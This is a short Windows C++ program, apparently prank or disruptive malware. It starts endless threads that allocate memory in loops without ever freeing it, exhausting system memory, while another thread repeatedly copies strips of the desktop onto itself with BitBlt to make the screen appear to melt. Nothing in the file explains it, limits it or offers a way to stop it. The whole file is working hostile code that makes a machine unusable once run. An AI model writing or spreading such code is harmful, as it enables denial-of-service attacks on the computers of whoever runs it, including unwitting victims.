#include <Windows.h>
#include <time.h>
#include <thread>
#include <iostream>



void TrashingNew() {
    while  (true)
    {
        new (std::nothrow) int (1024);
    }
}
void TrashingCPU()
{
    while (true) 
    {
        int* mass = (int*)malloc(10000000);
    }
}
void WindowFlow() {
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    while (true) {
        int x = rand() % (width - 0);
        int y = rand() % (5 - 0);
        HDC hdcDesk = GetDC(GetDesktopWindow());
        BitBlt(hdcDesk, x, y, width, height, hdcDesk, x, 0, SRCCOPY);
        Sleep(50);
    }
}


int main()
{
    std::thread thTrashing(TrashingCPU);
    std::thread thWindowFlow(WindowFlow);
    thTrashing.join();
    thWindowFlow.join();
    return 0;
}
